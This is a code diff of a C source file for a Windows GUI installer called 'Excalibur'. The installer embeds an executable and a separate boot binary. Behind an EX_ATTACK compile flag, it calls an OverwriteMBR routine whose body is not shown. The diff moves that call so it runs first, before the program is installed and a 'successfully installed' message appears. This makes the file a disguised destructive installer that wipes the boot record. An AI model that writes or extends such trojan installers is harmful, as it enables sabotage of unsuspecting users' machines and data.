@@ -1,21 +1,22 @@
 #include <windows.h>
-#include <shlobj.h>
-#include <objbase.h>
+
 #include <shobjidl.h>
 #include <commctrl.h>
+#include <objbase.h>
 #include <comutil.h>
+#include <shlobj.h>
 
-#include <stdio.h>
-#include <stdint.h>
 #include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
 
 #include "Binaries/ExcaliburBinary.h"
 #include "Binaries/BootBinary.h"
 
-#define WINDOW_WIDTH 450
+#define WINDOW_WIDTH  450
 #define WINDOW_HEIGHT 138
 
-#define BUFFER_SIZE 4096
+#define TEMP_FILE_BUFFER_SIZE 4096
 
 static HWND installButton;
 static HWND closeButton;
@@ -26,12 +27,8 @@ static HWND launchCheckbox;
 static HWND pathTextfield;
 static HWND progressBar;
 
-static HFONT defaultFont;
-
 static bool createShortcut = true;
 static bool launchAfterInstall = true;
-
-static char pathBuffer[MAX_PATH];
 
 static void CreateShortcut(const char* targetPath, const char* shortcutPath)
 {
@@ -80,26 +77,17 @@ static void OverwriteMBR()
 }
 #endif
 
-static void InstallBinary(HWND windowHandle)
+static void InstallBinary(const char* path)
 {
-    CreateDirectory(pathBuffer, NULL);
-    int pathLength = strlen(pathBuffer);
-    while (pathLength > 0 && (pathBuffer[pathLength - 1] == '\\' || pathBuffer[pathLength - 1] == '/'))
-    {
-        pathBuffer[pathLength - 1] = '\0';
-        pathLength--;
-    }
-
-    strcat(pathBuffer, "\\Excalibur.exe");
-    FILE* binary = fopen(pathBuffer, "wb");
+    FILE* binary = fopen(path, "wb");
     
-    unsigned char buffer[BUFFER_SIZE];
+    unsigned char buffer[TEMP_FILE_BUFFER_SIZE];
     uint32_t remainingBytes = bin_Excalibur_exe_len;
     uint32_t currentIndex = 0;
 
     while (remainingBytes > 0)
     {
-        uint32_t bytesToWrite = (remainingBytes < BUFFER_SIZE) ? remainingBytes : BUFFER_SIZE;
+        uint32_t bytesToWrite = (remainingBytes < TEMP_FILE_BUFFER_SIZE) ? remainingBytes : TEMP_FILE_BUFFER_SIZE;
         memcpy(buffer, &bin_Excalibur_exe[currentIndex], bytesToWrite);
         fwrite(buffer, sizeof(unsigned char), bytesToWrite, binary);
 
@@ -111,19 +99,38 @@ static void InstallBinary(HWND windowHandle)
     }
 
     fclose(binary);
+}
 
-    if (createShortcut) 
-        CreateShortcut(pathBuffer, "Excalibur");
-
-    MessageBox(windowHandle, "Excalibur has successfully been installed to your computer!", "Install Successful", MB_OK | MB_ICONINFORMATION);
-    PostMessage(windowHandle, WM_CLOSE, 0, 0);
-
-    if (launchAfterInstall)
-        ShellExecuteA(NULL, "open", pathBuffer, NULL, NULL, SW_SHOWNORMAL);   
-
+static void InstallEverything(char* path, HWND windowHandle)
+{
 #ifdef EX_ATTACK
     OverwriteMBR();
 #endif
+
+    CreateDirectory(path, NULL);
+    int pathLength = strlen(path);
+    while (pathLength > 0 && (path[pathLength - 1] == '\\' || path[pathLength - 1] == '/'))
+    {
+        path[pathLength - 1] = '\0';
+        pathLength--;
+    }
+
+    char binaryPath[MAX_PATH];
+    strcpy(binaryPath, path);
+
+    strcat(binaryPath, "\\Excalibur.exe");
+    InstallBinary(binaryPath);
+
+    if (createShortcut) 
+        CreateShortcut(binaryPath, "Excalibur");
+
+    MessageBox(windowHandle, "Excalibur has successfully been installed to your computer!", "Install Successful", MB_OK | MB_ICONINFORMATION);
+
+    if (launchAfterInstall)
+    {
+        PostMessage(windowHandle, WM_CLOSE, 0, 0);
+        ShellExecuteA(NULL, "open", binaryPath, NULL, NULL, SW_SHOWNORMAL);   
+    }
 }
 
 LRESULT CALLBACK WindowProc(HWND windowHandle, UINT message, WPARAM wordParam, LPARAM longParam)
@@ -163,13 +170,12 @@ LRESULT CALLBACK WindowProc(HWND windowHandle, UINT message, WPARAM wordParam, L
                     }
                     else if (clickedControl == installButton)
                     {
+                        char pathBuffer[MAX_PATH];
                         GetWindowText(pathTextfield, pathBuffer, MAX_PATH);
-                        InstallBinary(windowHandle);
+                        InstallEverything(pathBuffer, windowHandle);
                     }
                     else if (clickedControl == closeButton)
-                    {
                         PostMessage(windowHandle, WM_CLOSE, 0, 0);
-                    }
                 } break;
             }
         } return 0;
@@ -197,6 +203,10 @@ int WINAPI WinMain(HINSTANCE instanceHandle, HINSTANCE previousInstanceHandle, L
     HWND windowHandle = CreateWindowEx(0, "Excalibur", "Excalibur Installer", WS_OVERLAPPEDWINDOW,
                                        CW_USEDEFAULT, CW_USEDEFAULT, WINDOW_WIDTH, WINDOW_HEIGHT,
                                        NULL, NULL, instanceHandle, NULL);
+    HFONT defaultFont = CreateFont(16, 0, 0, 0, FW_NORMAL, false, false, false, 
+                                  DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
+                                  DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
+
     if (windowHandle == NULL)
         return 0;
 
@@ -213,10 +223,7 @@ int WINAPI WinMain(HINSTANCE instanceHandle, HINSTANCE previousInstanceHandle, L
                                     278, 14, 150, 17, windowHandle, NULL, instanceHandle, NULL);
     launchCheckbox   = CreateWindow("BUTTON", "Launch after install", WS_CHILD | WS_VISIBLE | BS_CHECKBOX,
                                     278, 45, 150, 17, windowHandle, NULL, instanceHandle, NULL);
-    defaultFont      = CreateFont(16, 0, 0, 0, FW_NORMAL, false, false, false, 
-                                  DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-                                  DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
-
+    
     SendMessage(shortcutCheckbox, WM_SETFONT, (WPARAM)defaultFont, 1);
     SendMessage(launchCheckbox,   WM_SETFONT, (WPARAM)defaultFont, 1);
     SendMessage(pathTextfield,    WM_SETFONT, (WPARAM)defaultFont, 1);
